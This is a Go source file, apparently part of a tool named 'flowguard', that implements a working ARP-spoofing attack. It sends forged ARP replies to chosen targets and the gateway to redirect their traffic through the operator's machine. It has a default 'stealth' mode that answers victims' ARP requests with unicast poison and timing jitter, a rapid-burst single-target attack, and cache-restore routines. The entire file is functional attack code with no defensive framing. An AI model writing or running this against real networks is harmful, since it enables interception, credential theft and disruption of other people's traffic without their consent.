package core

import (
	"net"
	"sync"
	"time"

	"github.com/bugkey24/flowguard/internal/models"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Spoofer struct {
	InterfaceName string
	MyMAC         net.HardwareAddr
	MyIP          net.IP
	GatewayIP     net.IP
	GatewayMAC    net.HardwareAddr
	
	Session       *models.SessionManager
	StopChan      chan struct{}
	stopOnce      sync.Once
	handle        *pcap.Handle
	Stealth       bool // [NEW] Stealth Mode
}

func NewSpoofer(iface string, myMAC net.HardwareAddr, myIP net.IP, gatewayIP net.IP, gatewayMAC net.HardwareAddr, session *models.SessionManager) *Spoofer {
	return &Spoofer{
		InterfaceName: iface,
		MyMAC:         myMAC,
		MyIP:          myIP,
		GatewayIP:     gatewayIP,
		GatewayMAC:    gatewayMAC,
		Session:       session,
		StopChan:      make(chan struct{}),
		Stealth:       true, // DEFAULT STEALTH
	}
}

func (s *Spoofer) Start() error {
	handle, err := pcap.OpenLive(s.InterfaceName, 65536, true, pcap.BlockForever)
	if err != nil { return err }
	s.handle = handle
	s.handle.SetBPFFilter("arp")

	ticker := time.NewTicker(100 * time.Millisecond) // Adjust the interval as needed
	
	go func() {
		defer s.handle.Close()
		defer ticker.Stop()
		go s.reactiveLoop()

		for {
			select {
			case <-s.StopChan:
				s.RestoreAll()
				return
			case <-ticker.C:
				if !s.Stealth {
					targets := s.Session.GetAllTargets()
					for _, t := range targets {
						s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
						s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
					}
				}
			}
		}
	}()
	return nil
}

// [FIX BUG SECOND ATTACKS].
func (s *Spoofer) AttackSingleTarget(t *models.TargetConfig) {
	if s.handle == nil { return }
	// Send 10 rapid poison packets to ensure the target is poisoned
	go func() {
		for i := 0; i < 10; i++ {
			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.MyMAC)
			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC)
			time.Sleep(10 * time.Millisecond)
		}
	}()
}

func (s *Spoofer) reactiveLoop() {
	src := gopacket.NewPacketSource(s.handle, layers.LayerTypeEthernet)
	in := src.Packets()
	for {
		select {
		case <-s.StopChan: return
		case packet, ok := <-in:
			if !ok { return }
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil { continue }
			arp, _ := arpLayer.(*layers.ARP)
			if arp.Operation != layers.ARPRequest { continue }

			reqIP := net.IP(arp.DstProtAddress)
			srcIP := net.IP(arp.SourceProtAddress)

			// AGILITY: Lower jitter for fast re-probes (Apple NUD)
			time.Sleep(time.Duration(2+_randInt(8)) * time.Millisecond)

			if reqIP.Equal(s.GatewayIP) {
				if t := s.Session.GetTargetByIP(srcIP); t != nil {
					// REPLY TO REQUESTER (Unicast eth)
					s.sendPoisonUnicast(t.IP, t.MAC, s.GatewayIP, s.MyMAC, arp.SourceHwAddress)
					
					// Double tap for higher success
					if !s.Stealth {
						time.Sleep(1 * time.Millisecond)
						s.sendPoisonUnicast(t.IP, t.MAC, s.GatewayIP, s.MyMAC, arp.SourceHwAddress)
					}
				}
			}
			if t := s.Session.GetTargetByIP(reqIP); t != nil {
				// REPLY TO REQUESTER (Unicast eth)
				s.sendPoisonUnicast(s.GatewayIP, s.GatewayMAC, t.IP, s.MyMAC, arp.SourceHwAddress)
			}
		}
	}
}

func _randInt(n int) int {
	return int(time.Now().UnixNano() % int64(n))
}

// [REMOVED] findTargetByIP is now handled by SessionManager.GetTargetByIP

func (s *Spoofer) RestoreAll() {
	targets := s.Session.GetAllTargets()
	for i := 0; i < 3; i++ {
		for _, t := range targets {
			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func (s *Spoofer) RestoreTarget(t *models.TargetConfig) {
	if s.handle == nil { return }
	// Spam real packets to restore ARP cache
	go func() {
		for i := 0; i < 10; i++ {
			s.sendPoison(t.IP, t.MAC, s.GatewayIP, s.GatewayMAC)
			s.sendPoison(s.GatewayIP, s.GatewayMAC, t.IP, t.MAC)
			time.Sleep(10 * time.Millisecond)
		}
	}()
}

func (s *Spoofer) sendPoison(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr) {
	s.sendPoisonUnicast(dstIP, dstMAC, srcIP, srcMAC, dstMAC)
}

func (s *Spoofer) sendPoisonUnicast(dstIP net.IP, dstMAC net.HardwareAddr, srcIP net.IP, srcMAC net.HardwareAddr, ethDst net.HardwareAddr) {
	if s.handle == nil { return }
	eth := layers.Ethernet{ SrcMAC: s.MyMAC, DstMAC: ethDst, EthernetType: layers.EthernetTypeARP }
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4, HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPReply,
		SourceHwAddress: []byte(srcMAC), SourceProtAddress: []byte(srcIP), DstHwAddress: dstMAC, DstProtAddress: []byte(dstIP),
	}
	buf := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp)
	_ = s.handle.WritePacketData(buf.Bytes())
}

func (s *Spoofer) Stop() { s.stopOnce.Do(func() { close(s.StopChan) }) }